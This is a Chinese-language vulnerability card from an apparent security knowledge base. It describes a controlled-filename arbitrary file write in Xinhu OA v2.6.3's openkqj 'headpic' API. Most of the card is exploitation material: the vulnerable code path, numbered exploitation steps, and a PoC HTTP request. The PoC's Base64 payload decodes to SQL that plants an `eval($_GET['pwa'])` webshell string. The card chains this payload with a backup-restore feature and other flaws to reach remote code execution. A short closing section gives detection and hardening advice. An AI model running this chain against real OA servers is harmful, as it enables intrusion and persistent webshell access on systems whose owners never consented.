---
id: web-generic-file-upload-xinhu-openkqj-headpic-controlled-filename-write
title: 信呼OA v2.6.3 openkqj api headpic：base64 内容写入 UPDIR/face/kqj{snid}_u{uid}.jpg，sn/ccid 可控得到已知文件名任意文件写
type: scenario
domain: web
path: web/generic/file-upload
technique: xinhu-openkqj-headpic-controlled-filename-write
aliases:
- 信呼OA headpic 任意文件写入
- openkqj api headpic
- saveheadpic 可控文件名
- kqj1_u1.jpg
- UPDIR/face 写入
- 可控文件名上传
tags:
- web
- php
- xinhu
- oa
- arbitrary-file-write
- controlled-filename
- file-upload
- openapi
- chain
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: v2.6.3（原文标记：测试版本，最新版）
verification:
  verified_by: verifier-V305
  verified_at: '2026-11-08T11:50:50+08:00'
  notes: 已对照原文核对：openkqjAction apiAction 取 sn 查/插 kqjsn 得 snid；act=post 时 postdata json_decode；data=headpic 调 saveheadpic(snid, rs['ccid'], rs['headpic'])；saveheadpic 将 base64_decode(headpic) 写入 UPDIR/face/kqj<snid>_u<uid>.jpg 并记录路径；图12 请求 sn=1、ccid=1、headpic 为 JSON 的 base64，响应 status:1/info:ok/data:[1]；图13/14/15 显示该文件被备份恢复读取并最终 getshell。卡片明确标注固定 .jpg 不能直接执行、需与备份恢复组合、请求带后台 Cookie 未验证无会话可达，边界准确。dedup 与同接口 savefingerprint SQLi 卡为 related（cos 0.893），sink 不同（文件写 vs SQL 注入）；dup-scan 与 opendkq zktime sn insert 为 related，非同一链，均保留。affected_versions 按原文测试版本 v2.6.3（最新版）保留。未验证点：未在本机复现；ccid 路径穿越仅为设想未验证。无 sources/source_url。
---

## 一句话结论

信呼OA v2.6.3 的 `webmain/task/openapi/openkqjAction.php::apiAction` 在 `act=post` 时解析 POST JSON，`data=headpic` 会进入 `kqjcmdModel::postdata` → `saveheadpic($snid,$uid,$headpic)`，把 `base64_decode($headpic)` 写入 `UPDIR/face/kqj<snid>_u<uid>.jpg`；`sn` 参数决定 snid、JSON 里的 `ccid` 决定 uid，内容完全由 `headpic` 控制，因此得到一个“文件名可预测、内容任意”的写入原语（后缀固定 `.jpg`），原文用它放入已知文件名的 JSON 备份，配合备份恢复接口执行 SQL。

## 原理

- **入口**：`apiAction()` 读取 `$num = $this->get('sn')`（设备号）；没有则 `return 'notdata'`。`$snid = (int)$dbs->getmou('id', "`num`='$num'")`，若为 0 则 `$dbs->insert(array('num'=>$num,'optdt'=>...,'status'=>1))` 并取新 id；随后 `$this->snid = $snid`。
- **POST 数据进入模型**：当 `$act=='post' && $this->postdata!=''` 时调用 `m('kqjcmd')->postdata($this->snid, $this->postdata)`；`postdata` 里 `json_decode($dstr, true)`，遍历数组，取 `$dtype = arrvalue($rs, 'data')`；当 `$dtype == 'headpic'` 时调用 `$this->saveheadpic($snid, $rs['ccid'], $rs['headpic'])`。
- **写入逻辑**：
  ```php
  private function saveheadpic($snid, $uid, $headpic, $face='') {
      $where = "`snid`='$snid' and `uid`='$uid'";
      if(isempt($face)){
          if(isempt($headpic))return;
          $face = ''.UPDIR.'/face/kqj'.$snid.'_u'.$uid.'.jpg';
          $this->rock->createtxt($face, base64_decode($headpic));
      }
      // 记录 headpic 路径...
  }
  ```
  `$snid` 来自 `sn` 查表/插入后的整型 id，`$uid` 来自 JSON 的 `ccid`，`$headpic` 是 Base64 字符串；文件名 `kqj<snid>_u<uid>.jpg` 可预测，内容为任意二进制。
- **为什么可控**：`sn` 决定 snid（同一设备号重复请求会复用同一条 `kqjsn`，id 稳定），`ccid` 决定 uid（原文用 `"ccid":"1"`，文件名 `kqj1_u1.jpg`），`headpic` 直接 Base64 解码后落盘；三个参数都不需要随机值。
- **后缀限制**：固定 `.jpg`，不能直接当 PHP 执行；原文把它当作“已知文件名的任意文件写入”，内容是备份恢复接口需要的 JSON。要 RCE 需要与备份恢复（关联卡）或其它 include/rename/解析链组合。
- **鉴权说明**：该接口属于考勤机开放 API；原文请求带有后台 Cookie（`xinhu_mo_adminid` 等），同产品 `openkqj` 的其它方法存在重写 `initAction` 绕过 openkey 的未授权案例；本文只证明带会话下的写入，未验证无会话可达性，按“需相应接口访问权限”理解。

## 触发条件

- 信呼OA v2.6.3（原文测试版本，最新版）。
- 能访问 `openkqj` 的 `api` 接口（`/index.php/post?d=task&m=openkqj|openapi&a=api&sn=<num>`）；本文请求带后台会话。
- `UPDIR/face/` 目录可写，`createtxt` 有权限创建文件。
- 需要已知文件名时，`sn` 与 `ccid` 都可控（`sn` 可为新设备号，首次请求会插入并分配 id；也可用已存在设备号复用 id）。

## 利用步骤

1. 选一个 `sn`（设备号，如 `1`），发送 `act=post` 的 JSON；若该设备号不存在，接口会插入 `kqjsn` 并分配 id，后续同 `sn` 复用。
2. 构造 JSON：`{"aasd":{"data":"headpic","id":"1","headpic":"<base64>","ccid":"1"}}`；`ccid` 决定文件名中的 uid，`headpic` 是任意内容的 Base64。
3. POST 到 `/index.php/post?d=task&m=openkqj|openapi&a=api&sn=1`；响应 `{"status":1,"info":"ok","data":["1"]}` 表示处理成功。
4. 按 `UPDIR/face/kqj<snid>_u<uid>.jpg` 确认文件落盘（原文为 `kqj1_u1.jpg`），内容与 Base64 解码一致。
5. 把该文件名作为备份恢复的 `sid`，配合 `folder=.*/./face` 指向该目录，即可读取并执行其中的 JSON SQL（关联卡）。
6. 若文件名/内容不符：检查 `sn` 是否命中已有记录、`ccid` 是否被过滤、`UPDIR` 路径与权限、`headpic` 是否合法 Base64。

## PoC

原文请求（节选）：

```http
POST /index.php/post?d=task&m=openkqj|openapi&a=api&sn=1 HTTP/1.1
Cookie: PHPSESSID=...; xinhu_mo_adminid=...; xinhu_ca_adminuser=admin; xinhu_ca_rempass=0
Content-Type: application/json

{"aasd":{"data":"headpic","id":"1","headpic":"eyJrcWoxX3UxLmpwZyI6eyJjcmVhdGVzcWwiOiJ1cGRhdGUgeGluaHVfZmxvd19zZXQgc2V0IG5hbWU9XCIqXC9ldmFsKCRfR0VUWydwd2EnXSk7XC8qXCIgIHdoZXJlIGlkPTE2MzsifX0=","ccid":"1"}}
```

响应：

```json
{"status":1,"info":"ok","data":["1"]}
```

落盘路径：

```text
UPDIR/face/kqj1_u1.jpg
```

其内容为 Base64 解码后的 JSON：

```json
{"kqj1_u1.jpg":{"createsql":"update xinhu_flow_set set name=\"*/eval($_GET['pwa']);/*\" where id=163;"}}
```

## 变体与关联

- **后续利用**：[[web-generic-sqli-xinhu-beifen-huifdatanew-createsql-arbitrary-sql]] 读取该 JSON 并执行 `createsql`；再配合 [[web-php-rce-xinhu-flowaction-inputaction-generated-mode-file-comment-breakout]] 完成 RCE。
- **同产品上传 RCE**：[[web-generic-file-upload-xinhu-oa-qcloudcos-runt-fileid-upload-exec]] 是上传 + `qcloudCos|runt&fileid` 触发临时文件重命名为 `.php` 的 getshell；本卡是 `headpic` 固定 `.jpg` 的可控文件名写入，需与其它链组合。
- **同接口其它漏洞**：[[web-generic-sqli-xinhu-kqjcmd-savefingerprint-openkqj-unauth]] 是 `openkqj` 的 `savefingerprint` SQL 注入（且提到重写 `initAction` 绕过 openkey），与本卡的 `headpic` 文件写入是不同方法/sink。
- **同类可控文件名写入**：其它 CMS 的“头像/附件按用户 id 命名”接口若不对 uid 做数字校验，也可能得到可预测文件名；可结合备份恢复/包含/重命名利用。
- **边界**：固定 `.jpg` 后缀，不能直接执行 PHP；`ccid` 若未过滤特殊字符，文件名拼接可能存在路径穿越（本文未验证，勿直接断言）；不同版本 `UPDIR` 常量与目录结构可能变化。

## 检测与防御

- **参数校验**：`sn`/`ccid` 强制为整数并做范围检查；`headpic` 校验 Base64 与图片类型/大小，不允许任意二进制落盘。
- **文件名与目录**：头像文件用随机文件名（UUID）而非 `kqj<snid>_u<uid>`；存储目录放在 Web 根之外或禁止脚本执行；对 `ccid` 做 `basename`/白名单，防止路径拼接。
- **接口鉴权**：考勤机开放 API 使用设备密钥/签名（openkey）并强制校验；不需要时关闭 `openkqj` 路由。
- **检测**：监控 `UPDIR/face/` 下非图片内容的写入、`kqj*_u*.jpg` 文件被备份恢复接口读取；审计 `openkqj` 的 `data=headpic` 请求与异常 `ccid`。
- **合规**：仅在授权环境复现；不要在生产 OA 写入任意内容。
